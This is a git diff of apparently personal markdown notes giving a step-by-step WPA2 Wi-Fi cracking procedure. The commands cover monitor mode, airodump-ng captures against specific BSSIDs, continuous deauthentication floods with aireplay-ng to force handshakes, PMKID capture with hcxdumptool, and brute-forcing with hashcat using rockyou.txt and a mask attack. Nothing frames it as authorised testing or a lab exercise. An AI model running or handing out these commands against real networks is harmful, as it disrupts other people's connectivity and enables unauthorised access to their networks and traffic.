@@ -46,56 +46,53 @@ When the client connects back, we capture the 4-way handshake packets EAPOL Pack
 
 We dont need to decrypt this, rather we just need to match with the leaked password list and get the wifi password !! 
 
+## Steps to get the certificate
 
-#  scan the wifi : 
-sudo iwlist scan 
+* Change to Monitor Mode : `sudo airmon-ng start wlo1`
+ 
+* Scan the wifi : `sudo iwlist scan`
 
-# top networks
+* Top networks
+```
 sudo airdump-ng start wlo1mon , or , 
 sudo airodump-ng wlo1mon --write scan --output-format csv
+```
+* Set the channel to capture : `sudo iw dev wlo1mon set channel 1`
 
-# set the channel to capture
-sudo iw dev wlo1mon set channel 1
+* Get all wifi present and bssid : `sudo iw dev wlo1 scan`
 
-# get all wifi present and bssid
-sudo iw dev wlo1 scan 
+* Get into monitor mode : `sudo airmon-ng start wlo1`
 
-## Get into monitor mode 
-sudo airmon-ng start wlo1
+* Manager mode : `sudo airmon-ng stop wlo1mon`
 
-## manager mode
-sudo airmon-ng stop wlo1mon
+* Airodump : `sudo airodump-ng --bssid <bssid> -c <channel-name> -w capture wlo1mon`
 
+To check how many beacons you have passed and see if any relevant signal has been catched or not !!
+* sudo airodump-ng -w '<hack2>' -c '<1>' --bssid '<A8:DA:0C:BD:0B:57>' wlo1mon
 
-## airodump : 
-sudo airodump-ng --bssid <bssid> -c <channel-name> -w capture wlo1mon
-
-eg:
-sudo airodump-ng --bssid 6c:4f:89:9a:3f:af -c 44 -w capture wlo1mon
-
-## aireplay 
-
-sudo aireplay-ng --deauth 20 -a 6c:4f:89:9a:3f:af wlo1mon --ignore-negative-one
-
-
-# HASHCAT for WPA-2
-
-## PMKID ( Pairwise Master Key Identifier (PMKID) )
-
-# hcxdump-tool
-sudo hcxdumptool -i wlo1mon -w pmkid.pcapng --rds=1
-
-# Tool to unpack
-hcxpcapngtool -o pmkid.hccapx pmkid.pcapng
-
-# Decode 
-hashcat -m 22000 pmkid.hc22000 rockyou.txt --force
+* Send deauth request at scale : `sudo aireplay-ng --deauth 0 -a <48:22:54:4C:CA:18> wlo1mon`
+OR  
+`sudo aireplay-ng --deauth 20 -a 6c:4f:89:9a:3f:af wlo1mon --ignore-negative-one`
 
 
 ![hacked](https://github.com/user-attachments/assets/8ab726b5-c6b8-43e9-b184-a7207d1f3163)
 
+So it all comes down to having a list of all possible passwords and then hash them and see which one is the matching the user and if the password is unique enough then we run out of luck ..  
 
+## Using GPU to Crack the password 
 
+Once the desired 4 way certificate is captured and you will see that your terminal output also use that to see the output in wireshark (optional) and then use it to generate .hash 
+
+Dont use hashcat-utils (its not working for my case) it's actually making the file corrupt
+
+Convert from `.cap` (captured certificates) to the .hash using `hcxpcaptool` from AUR and use it using 
+
+`hcxpcapngtool -o correct_wpa2.hash hack3-01.cap`    
+
+Then use this .hash file with hashcat to get the output 
+
+Here the 22000 is for wpa2 , the last one is the mask and a : ascii , d: number-digits  
+`hashcat -m 22000 -a 3 correct_wpa2.hash '?a?a?a?a?a?a?a?a?a'`
 
 
 
